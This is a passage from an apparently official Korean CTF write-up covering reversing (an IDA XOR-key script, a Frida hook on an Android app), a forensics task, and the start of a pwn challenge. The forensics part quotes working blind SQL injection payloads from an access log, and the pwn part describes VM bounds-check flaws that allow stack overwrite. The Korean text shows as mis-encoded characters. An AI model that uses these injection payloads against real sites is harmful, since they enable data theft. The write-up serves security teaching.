        # 5ê¸€ì ë³´ë‹¤ ë§ì„ ê²½ìš°
        if key_size != 5:
            xor_key += [0x00] * (key_size - 5)

            # ëª¨ë¥´ëŠ” ê¸€ìëŠ” 0x00ìœ¼ë¡œ ì±„ìš°ê³  Xor ì—°ì‚° ìˆ˜í–‰
            data = xor_data(addr_patch, addr_end, xor_key)
            
            # ê³µí†µ 58ë°”ì´íŠ¸ ì½”ë“œ
            known_data = [0xC7, 0x45, 0xF8, 0x04, 0xB3, 0x44, 0x00, 0x8B, 0x45, 0xF8, 0x83, 0xC0, 0x01, 0x89, 0x45, 0xF4, 0x8B, 0x4D, 0xF8, 0x8A, 0x11, 0x88, 0x55, 0xFF, 0x83, 0x45, 0xF8, 0x01, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xEE, 0x8B, 0x45, 0xF8, 0x2B, 0x45, 0xF4, 0x89, 0x45, 0xF0, 0x8B, 0x4D, 0xF0, 0x89, 0x0D, 0x00, 0xB3, 0x44, 0x00]
            known_data = &amp;quot;&amp;quot;.join(chr(x) for x in known_data)
            
            # ê³µí†µ 58ë°”ì´íŠ¸ ì½”ë“œë¥¼ í†µí•œ, Key ì „ë¶€ë¥¼ ë³µêµ¬
            xor_key = xor_key[:5]
            for i in range(len(data) - key_size):
                # ê³µí†µ ì½”ë“œì™€ Xor ìˆ˜í–‰í•œ ê²°ê³¼ë¥¼ 5ë°”ì´íŠ¸ì”© ë¹„êµ
                cur_data = &amp;quot;&amp;quot;.join(chr(x) for x in data[i:i+5])
                idx = known_data.find(cur_data)
                if idx != -1:   #
                    # ê³µí†µ ì½”ë“œì˜ ì–´ëŠ ì¸ë±ìŠ¤ë¶€í„° Keyì´ ì‹œì‘ ë˜ëŠ”ì§€ í™•ì¸
                    # (Key í¬ê¸°, ë”ë¯¸ ì½”ë“œ ë“±ì— ì˜í•´ ì˜¤í”„ì…‹ì´ ë§¤ë²ˆ ë‹¤ë¥´ê¸° ë•Œë¬¸)
                    org = known_data[idx+5:idx+5+key_size]
                    for j in range(key_size - 5):
                        xor_key.append(ord(org[j]) ^ data[i+5+j]) #Key ë³µêµ¬
                    break
            
            if len(xor_key) == 5:
                # Flag ì¶œë ¥ í•¨ìˆ˜(11 ë²ˆì§¸)ì˜ ê²½ìš° ì˜ˆì™¸ë¡œ ì²˜ë¦¬
                if cnt == 9:
                    xor_key += [ord(&amp;#x27;r&amp;#x27;), ord(&amp;#x27;i&amp;#x27;), ord(&amp;#x27;n&amp;#x27;)] #mandarin
                else:
                    print &amp;quot;Error!!&amp;quot;
                    xor_key += [0x00] * (key_size - 5)
        
    print &amp;quot;&amp;quot;.join(chr(x) for x in xor_key)
    keys.append(&amp;quot;&amp;quot;.join(chr(x) for x in xor_key))
    
    
    patch_xor(addr_patch, addr_end, xor_key)    # ì¶”ì¶œí•œ Keyë¥¼ í†µí•´ íŒ¨ì¹˜ ìˆ˜í–‰
    idc.MakeCode(addr_patch)                    # ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¡œ ë³€í™˜
    idc.MakeFunction(addr_patch)                # í•¨ìˆ˜í™” ìˆ˜í–‰
    
    cur = addr_patch
    cnt += 1

f = open(&amp;quot;solve_key.txt&amp;quot;, &amp;quot;wb&amp;quot;)                 # ì¶”ì¶œí•œ Keyë¥¼ ì €ì¥
for i in range(len(keys)):
    f.write(keys[i])
    f.write(&amp;quot;\r\n&amp;quot;)
f.close()&lt;/code&gt;&lt;/pre&gt;&lt;figure id=&quot;3277b602-700b-4d19-8acd-ea0c781589ba&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/18_flag2.png&quot;&gt;&lt;img style=&quot;width:499px&quot; src=&quot;/assets/bob/18_flag2.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                            [ê·¸ë¦¼ 7] ë‘ ë²ˆì§¸ Flag íšë“&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;789f9b77-e64a-4504-b960-042cb090ef27&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Flag ë˜í•œ ìë™ìœ¼ë¡œ ì—°ì‚°í•  ìˆ˜ ìˆì§€ë§Œ, ìë™í™”ë¡œ ì¶”ì¶œí•œ ì…ë ¥ ê°’ì„ ë³µì‚¬ í›„ ëŒ€ì…í•˜ì—¬ íšë“í•˜ì˜€ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;4efcd544-d4da-4082-9267-bb763d3c30f5&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;9e1053cd-3884-45db-a37a-32471921d7f0&quot; class=&quot;&quot;&gt;EASYROID&lt;/h2&gt;&lt;hr id=&quot;698861a0-5f38-40bc-b55e-355837ab6e62&quot;/&gt;&lt;figure id=&quot;770f5db6-8e99-4510-b52c-eefaa1425a86&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob954.png&quot;&gt;&lt;img style=&quot;width:712px&quot; src=&quot;/assets/bob/bob954.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;d1c6dd1d-2f4d-4c56-ac8b-850c4c3cd40c&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;Easy Android Reversing Challenge&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;1d112550-6738-4612-8d22-ee47b42f78e2&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;289a6841-cd2d-4082-bb66-58cad5e23daf&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;JAVA ì½”ë“œë¥¼ ë¨¼ì € ì‚´í´ë³´ì.&lt;figure id=&quot;542a7a21-98af-47cf-b0bf-5673ffc2d4d4&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob955.png&quot;&gt;&lt;img style=&quot;width:599px&quot; src=&quot;/assets/bob/bob955.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;98a20162-fcd7-49ee-8430-13752c8ef80a&quot; class=&quot;&quot;&gt;&lt;code&gt;MainActivity&lt;/code&gt;ê°€ ì‹¤í–‰ë˜ë©´ &lt;code&gt;&lt;a href=&quot;http://native-lib.so&quot;&gt;libnative-lib.so&lt;/a&gt;&lt;/code&gt;ì— ì •ì˜ë˜ì–´ ìˆëŠ” &lt;code&gt;stringFromJNI&lt;/code&gt; í•¨ìˆ˜ë¥¼ í˜¸ì¶œ í•œë’¤ &lt;code&gt;setText&lt;/code&gt;ë¡œ &lt;code&gt;TextView&lt;/code&gt;ì— ë„£ì–´ì£¼ëŠ” ê°„ë‹¨í•œ ì½”ë“œì´ë‹¤.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;4b7f7f2d-8dcb-4159-9153-a2413f9075e6&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;8bdc6317-9a12-411f-ba17-cf13b11295a6&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;stringFromJNI&lt;/code&gt; í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ì.&lt;figure id=&quot;a6338060-bf4a-4964-b84c-4b5fcdecdb1f&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob956.png&quot;&gt;&lt;img style=&quot;width:580px&quot; src=&quot;/assets/bob/bob956.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;a2effdc4-9bb2-4d45-8adf-8181542cc263&quot; class=&quot;&quot;&gt;&lt;code&gt;stringFromJNI&lt;/code&gt; í•¨ìˆ˜ëŠ” &lt;code&gt;Hello BOB9?&lt;/code&gt; ë¬¸ìì—´ì„ ë¦¬í„´í•´ì¤€ë‹¤.&lt;/p&gt;&lt;p id=&quot;42da8e6b-3945-4334-91dc-27ba70336c59&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;2fb6fb81-fab9-40e5-8255-11fd9e351410&quot; class=&quot;&quot;&gt;ê²°êµ­ ì•±ì„ ì‹¤í–‰í•˜ë©´ í™”ë©´ì— &lt;code&gt;Hello BOB9?&lt;/code&gt; ë¬¸ìì—´ì´ ì¶œë ¥ëœìš”. ì‹¤í–‰í•´ì„œ í™•ì¸í•˜ì.&lt;/p&gt;&lt;figure id=&quot;1f7531c2-8517-42f6-a90e-6b55a367b868&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob957.png&quot;&gt;&lt;img style=&quot;width:290px&quot; src=&quot;/assets/bob/bob957.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;ë¹™ê³ !&lt;/figcaption&gt;&lt;/figure&gt;&lt;p id=&quot;fd8c547d-5464-42c6-bfdc-6f6b545b66bb&quot; class=&quot;&quot;&gt; &lt;code&gt;&lt;a href=&quot;http://native-lib.so&quot;&gt;libnative-lib.so&lt;/a&gt;&lt;/code&gt;ì˜ Export Tableì„ ì‚´í´ë³´ë©´ &lt;code&gt;stringFromJNI&lt;/code&gt; í•¨ìˆ˜ ì´ ì™¸ í•œ ê°€ì§€ í•¨ìˆ˜ê°€ ë” ì¡´ì¬í•œë‹¤.&lt;/p&gt;&lt;figure id=&quot;50106b8d-d5b8-4407-a212-7b5cc9eed45b&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob958.png&quot;&gt;&lt;img style=&quot;width:446px&quot; src=&quot;/assets/bob/bob958.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;HiddenStage!!!&lt;/figcaption&gt;&lt;/figure&gt;&lt;p id=&quot;3d2836a2-4085-47e2-a9e7-f55139a320e1&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;5f9259aa-155c-4ae4-9359-c10d27c7172b&quot; class=&quot;&quot;&gt;HiddenStage í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ì.&lt;/p&gt;&lt;figure id=&quot;d858f375-3a1b-4fb4-acb6-a88446b791e7&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob959.png&quot;&gt;&lt;img style=&quot;width:621px&quot; src=&quot;/assets/bob/bob959.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;6bd13c3c-9aef-4d26-99ee-de1f988c5947&quot; class=&quot;&quot;&gt;BLOWFISH ë¥¼ ì‚¬ìš©í•´ì„œ íŠ¹ì • ê°’ì„ Decrypt í•˜ê³  Flagë¥¼ ì¶œë ¥í•´ë³´ì.&lt;/p&gt;&lt;p id=&quot;20963073-9e06-4ecc-a317-d3aa4d9db1d1&quot; class=&quot;&quot;&gt;ë”°ë¼ì„œ &lt;code&gt;F0&lt;/code&gt;ë¥¼ BLOWFISHì˜ í‚¤ë¡œ &lt;code&gt;BOB9&lt;/code&gt;ì„ ì‚¬ìš©í•´ì„œ Decrypt í•´ì£¼ë©´ Flagê°€ ë‚˜ì˜¤ê² ì§€?&lt;/p&gt;&lt;p id=&quot;3893a2f4-59dd-4be5-b00d-9bfd82d9ab46&quot; class=&quot;&quot;&gt;í•˜ì§€ë§Œ ì—¬ê¸°ì„œ &lt;code&gt;Fake&lt;/code&gt;ê°€ ì¡´ì¬í•œë‹¤. Initì˜ ë§ˆì§€ë§‰ ì¸ìëŠ” Key Sizeì¸ë° 7ì´ë‹¤.&lt;/p&gt;&lt;p id=&quot;82d93b2c-d4d6-4a07-87d0-3fd367ce8a86&quot; class=&quot;&quot;&gt;ë”°ì„œ ì‹¤ì œ BLOWFISHì˜ í‚¤ ê°’ì€ &lt;code&gt;BOB9\x00\x00\x00&lt;/code&gt;!&lt;/p&gt;&lt;p id=&quot;7ae058f8-7e9d-4de8-a41e-1472795c7e70&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;32e1b75a-d74d-424b-8403-f68e362bfa89&quot; class=&quot;&quot;&gt;ì´ëŸ° Fakeì— ë‹¹í•˜ì§€ ì•Šìœ¼ë ¤ë©´ ì‹¤ì œë¡œ ê·¸ëŒ€ë¡œ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì´ ìˆë‹¤.&lt;/p&gt;&lt;p id=&quot;03aabc70-de76-4f3c-bc7f-3f9dc3fbc017&quot; class=&quot;&quot;&gt;ìƒˆë¡œìš´ í”„ë¡œì íŠ¸ë¥¼ ë§Œë“¤ì–´ì„œ .soë¥¼ ë¼ì›Œë„£ê³  ì»´íŒŒì¼í•˜ëŠ” ë°©ë²•ë„ ìˆê² ì§€ë§Œ Fridaë¥¼ ì‚¬ìš©í•´ë³´ì.&lt;/p&gt;&lt;p id=&quot;afe7953e-6cdc-47b7-abb1-e57a918f32cc&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;7f96bb9d-407a-4895-9a0c-15b74ddab8b1&quot; class=&quot;code&quot;&gt;&lt;code&gt;var addrStringFromJNI = Module.findExportByName(null, &amp;#x27;Java_jeong_su_bob9_1easy_1android_MainActivity_stringFromJNI&amp;#x27;);
var addrHiddenStage = Module.findExportByName(null, &amp;#x27;Java_jeong_su_bob9_1easy_1android_MainActivity_HiddenStage&amp;#x27;);
var HiddenStage = new NativeFunction(addrHiddenStage, &amp;#x27;int&amp;#x27;, [&amp;#x27;pointer&amp;#x27;]);

Interceptor.attach(addrStringFromJNI, {
	onEnter: function(argv){
		this.arg0 = argv[0];
	},
	onLeave: function(rets){
		rets.replace( HiddenStage(this.arg0) );
	}
});&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;cb4c7566-d735-412d-b3ec-9d0188dd22f5&quot; class=&quot;&quot;&gt;ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” stringFromJNI í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë©´ HiddenStage í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ë¦¬í„´ì„ ë³€ê²½í•´ì£¼ëŠ” ìŠ¤í¬ë¦½íŠ¸ì´ë‹¤.&lt;/p&gt;&lt;p id=&quot;e0a893d0-faf9-4a3c-a655-d6db98538699&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;64078f24-42e2-4303-b631-644fb9af25d1&quot; class=&quot;code&quot;&gt;&lt;code&gt;am start -n jeong.su.bob9_easy_android/.MainActivity&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;397d049b-f27e-4f94-9868-a7adc484c9e3&quot; class=&quot;&quot;&gt;ê·¸ë¦¬ê³  MainActivityë¥¼ am ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹œì‘í•´ì£¼ë©´ ì•„ë˜ì™€ ê°™ì´ í”Œë˜ê·¸ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;p id=&quot;6646536d-d85f-4c50-9c60-a75301903f9d&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;6e105802-75e7-4856-bb70-988a75e54a01&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob960.png&quot;&gt;&lt;img style=&quot;width:372px&quot; src=&quot;/assets/bob/bob960.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;h1 id=&quot;9b799560-d728-49a3-a967-971a0d033d4f&quot; class=&quot;&quot;&gt;ğŸ–¥ï¸ FORENSIC&lt;/h1&gt;&lt;h2 id=&quot;64558c76-c410-4400-ab49-15766f8520d8&quot; class=&quot;&quot;&gt;SQL Eyes&lt;/h2&gt;&lt;hr id=&quot;1eea566b-99c7-4781-ba54-3dafef735ea3&quot;/&gt;&lt;figure id=&quot;18b57247-622d-4c2f-8d27-6e6d923337da&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob961.png&quot;&gt;&lt;img style=&quot;width:709px&quot; src=&quot;/assets/bob/bob961.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;20691f4d-3f7e-4f8e-a772-8a8176c8685d&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;Find the leaked data&lt;/div&gt;&lt;/figure&gt;&lt;ul id=&quot;b761d9fa-8683-4589-960e-e0839b568999&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•´ë‹¹ ë¬¸ì œì—ì„œëŠ” ì›¹ ì„œë²„ì˜ access.log íŒŒì¼ì´ ì œê³µë˜ì—ˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;ccc05a17-e90e-4c5a-b20f-1ccff4d1b4ce&quot; class=&quot;code&quot;&gt;&lt;code&gt;192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &amp;quot;GET /view.php?idx=1 HTTP/1.1&amp;quot; 200 202 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&amp;quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &amp;quot;GET /view.php?idx=2-1 HTTP/1.1&amp;quot; 200 202 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&amp;quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &amp;quot;GET /view.php?idx=0%7C%7C1-- HTTP/1.1&amp;quot; 200 202 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&amp;quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &amp;quot;GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C1%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1&amp;quot; 500 185 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&amp;quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &amp;quot;GET /archives/ HTTP/1.1&amp;quot; 404 437 &amp;quot;-&amp;quot; &amp;quot;DirBuster-0.12 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)&amp;quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &amp;quot;GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C2%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1&amp;quot; 200 203 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&amp;quot;
192.168.47.1 - - [21/Aug/2020:12:51:50 -0700] &amp;quot;GET /view.php?idx=0%7C%7Cif%28substr%28lpad%28bin%28ord%28substr%28flag%2C1%2C1%29%29%29%2C8%2C0%29%2C3%2C1%29%3D1%2C1%2C%28select+1+union+select+2%29%29-- HTTP/1.1&amp;quot; 200 202 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&amp;quot;&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;f21723cb-4ff4-4761-b462-db0e42128df3&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;access.logë¥¼ í†µí•´ ë°ì´í„°ë¥¼ ìœ ì¶œí•œ ê³µê²©ì€ Blind SQL Injection ê³µê²©ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆëŠ”ë° ìœ í˜•ì´ 2ê°€ì§€ê°€ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;25065056-66b5-4ba7-95ef-5c46c70be77d&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;code&gt;0||if(substr(lpad(bin(ord(substr(flag,1,1))),8,0),1,1)=1,1,(select 1 union select 2))&lt;/code&gt;ì„ í†µí•´ ê±°ì§“ì¼ ê²½ìš°ì—ëŠ” 500 ì—ëŸ¬ë¥¼ ë°œìƒì‹œì¼œ Error based SQL Injection ê³µê²©ì„ í•œ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;1057687c-b74a-448c-8c89-31a877083533&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë‘ë²ˆì§¸ ìœ í˜•ì€ &lt;code&gt;0||if(substr(lpad(bin(ord(substr(flag,12,1))),8,0),1,1)=1,sleep(3)=0,1)=0--&lt;/code&gt; ì„ í†µí•´ ì°¸ì¼ ê²½ìš° 3ì´ˆ sleepí•˜ì—¬ Time based SQL Injection ê³µê²©ì„ í•œ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;4c13940f-742f-41a1-bca2-10d881f18a59&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ ë‘ê°€ì§€ ê³µê²© ê¸°ë²•ì„ í†µí•´ ê³µê²©ìê°€ ìœ ì¶œí•œ ë°ì´í„°ë¥¼ íŒŒì•…í•˜ë©´ ëœë‹¤. ì•„ë˜ì™€ ê°™ì´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì—¬ ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;ca3b2b1c-bea6-4dd6-9d9b-00b7c20cd21c&quot; class=&quot;code&quot;&gt;&lt;code&gt;f = open(&amp;#x27;access.log&amp;#x27;, &amp;#x27;r&amp;#x27;)
temp = &amp;quot;&amp;quot;
flag = &amp;quot;&amp;quot;
prevsec = 0
first_bypass = True

for line in f.readlines():
    x = line.split()
    
    if len(x) == 0:
        continue
        
    if &amp;quot;OWASP_DirBuster_Project&amp;quot; in x[-1]:
        continue
        
    if &amp;#x27;union&amp;#x27; in x[6]:
        if x[8] == &amp;#x27;200&amp;#x27;:
            temp += &amp;quot;1&amp;quot;
        else:
            temp += &amp;quot;0&amp;quot;
        
        if len(temp) % 8 == 0 and len(temp) != 0:
            flag += chr(int(temp, 2))
            print(flag)
            temp = &amp;quot;&amp;quot;
    
    if &amp;#x27;sleep&amp;#x27; in x[6]:
        if first_bypass:
            first_bypass = False
            continue
        hour, min, sec = x[3].split(&amp;quot;:&amp;quot;)[1:]
        allsec = int(min) * 60 + int(sec)
        relsec = allsec - 3111
            
        if (relsec - prevsec) &amp;gt; 2.5:
            temp += &amp;quot;1&amp;quot;
        else:
            temp += &amp;quot;0&amp;quot;
        
        if len(temp) % 8 == 0 and len(temp) != 0:
            flag += chr(int(temp, 2))
            print(flag)
            temp = &amp;quot;&amp;quot;
        
        prevsec = relsec&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;b577288c-0165-401f-8936-93bd3fada5fd&quot; class=&quot;&quot;&gt;ğŸ–¥ï¸ PWN&lt;/h1&gt;&lt;h2 id=&quot;39abfa2f-c121-4442-a769-09055252cd5e&quot; class=&quot;&quot;&gt;bvm-pwn&lt;/h2&gt;&lt;hr id=&quot;4f1a6ee9-8d69-479d-b320-fd1fb047a9fa&quot;/&gt;&lt;figure id=&quot;55bac55d-225c-4d10-aca8-c6d09da60b41&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob962.png&quot;&gt;&lt;img style=&quot;width:795px&quot; src=&quot;/assets/bob/bob962.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;92246095-b2e0-44e1-8b68-4efb3d98baf2&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;bvmì—ì„œ ì¼ë¶€ ê²½ê³„ ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ì§€ ì•ŠëŠ” ë£¨í‹´ì„ ì´ìš©í•˜ì—¬ stack ì˜ì—­ ë³€ì¡° ë° ì‰˜ íšë“&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;060e3db1-14f7-4894-8e5f-8fbd74bd5959&quot; class=&quot;&quot;&gt;bvm opcodeë¥¼ í•´ì„í•˜ê³  ì‹¤í–‰í•˜ëŠ” ê³¼ì •ì—ì„œ ì´ 3ê°€ì§€ ì·¨ì•½ì ì´ ì¡´ì¬í•œë‹¤.&lt;/p&gt;&lt;p id=&quot;ceaa9d84-cbf9-4804-9a3c-83f8ec1c7113&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ol id=&quot;d66829d5-e886-4f72-9c4c-45819a4c07b5&quot; class=&quot;numbered-list&quot; start=&quot;1&quot;&gt;&lt;li&gt;&lt;code&gt;COMP reg, reg&lt;/code&gt; opcodeì—ì„œ left register indexì— ëŒ€í•´ì„œëŠ” ê²½ê³„ ê²€ì‚¬ë¥¼ í•˜ì§€ë§Œ right register indexëŠ” ê²½ê³„ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•Šì•„, ê²½ê³„ë¥¼ ë„˜ëŠ” register indexë¥¼ ì°¸ì¡°í•˜ì—¬ 255ë²ˆ ë°˜ë³µ ë¹„êµë¥¼ í†µí•´ ì¼ë¶€ stack ì˜ì—­ì„ ê°„ì ‘ì ìœ¼ë¡œ leak í•  ìˆ˜ ìˆë‹¤.&lt;figure id=&quot;7e79a767-c514-4b79-805b-1aeef668bd69&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob963.png&quot;&gt;&lt;img style=&quot;width:527px&quot; src=&quot;/assets/bob/bob963.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;ead4992c-5207-445f-a383-ef9a26bc0d89&quot; class=&quot;numbered-list&quot; start=&quot;2&quot;&gt;&lt;li&gt;&lt;code&gt;LSHIRT/RSHIFT reg, reg, reg&lt;/code&gt;  opcodeì—ì„œ left register indexì— ëŒ€í•œ ê²½ê³„ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•Šì•„ ì¼ë¶€ stack ì˜ì—­ì„ ë®ì„ ìˆ˜ ìˆë‹¤.&lt;figure id=&quot;b619bdc6-e206-4743-a0a0-46524e59c073&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob964.png&quot;&gt;&lt;img style=&quot;width:560px&quot; src=&quot;/assets/bob/bob964.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;3e8311d7-b55d-4b94-b0a6-292aab12bd1e&quot; class=&quot;numbered-list&quot; start=&quot;3&quot;&gt;&lt;li&gt;&lt;code&gt;MOVE reg, [reg]&lt;/code&gt;  opcodeì—ì„œ register indexì— ëŒ€í•œ ê²½ê³„ ê²€ì‚¬ëŠ” í•˜ì§€ë§Œ &lt;code&gt;vm-&amp;gt;reg[right_idx]&lt;/code&gt;ê°€ &lt;code&gt;vm-&amp;gt;size&lt;/code&gt;ë³´ë‹¤ í°ì§€ì— ëŒ€í•œ ê²€ì‚¬ë¥¼ í•˜ì§€ì•Šì•„ ì¼ë¶€ stack ì˜ì—­ì„ leak í•  ìˆ˜ ìˆë‹¤.
3ë²ˆì˜ ê²½ìš° ì‚¬ì‹¤ ì˜ë„í•˜ì§€ ì•Šì€ ì·¨ì•½ì ìœ¼ë¡œ, ëŒ€íšŒ ë„ì¤‘ íŒ¨í‚· ëª¨ë‹ˆí„°ë§ì„ í–ˆì„ ë•Œ í”Œë˜ê·¸ë¥¼ íšë“í•œ 4ë¶„ ëª¨ë‘ 1ë²ˆ ëŒ€ì‹  ì´ ì·¨ì•½ì ì„ ì´ìš©í•˜ì˜€ë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;figure id=&quot;325e775e-3652-487b-a007-2215a152d378&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob965.png&quot;&gt;&lt;img style=&quot;width:617px&quot; src=&quot;/assets/bob/bob965.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;e8d7ba39-f641-4ae8-8e63-2f8f6e8791d2&quot; class=&quot;&quot;&gt;
